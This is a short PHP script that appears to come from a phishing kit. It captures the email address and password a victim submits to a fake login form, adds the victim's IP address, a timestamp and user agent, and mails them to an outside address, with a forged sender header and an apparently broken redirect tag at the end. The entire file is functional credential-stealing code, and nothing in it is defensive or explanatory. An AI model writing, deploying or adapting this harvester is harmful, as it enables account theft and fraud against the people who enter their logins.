<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "email: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";

$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= " - by U not ME -\n";

$recipient = "clownshow@detcetus.com";
$subject = "BIG 4";
$headers .= "BIG 4";
$headers = "From: PLUTO <admin1@arabmoney.com>";
mail($recipient,$subject,$message,$headers);?>




<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" ">
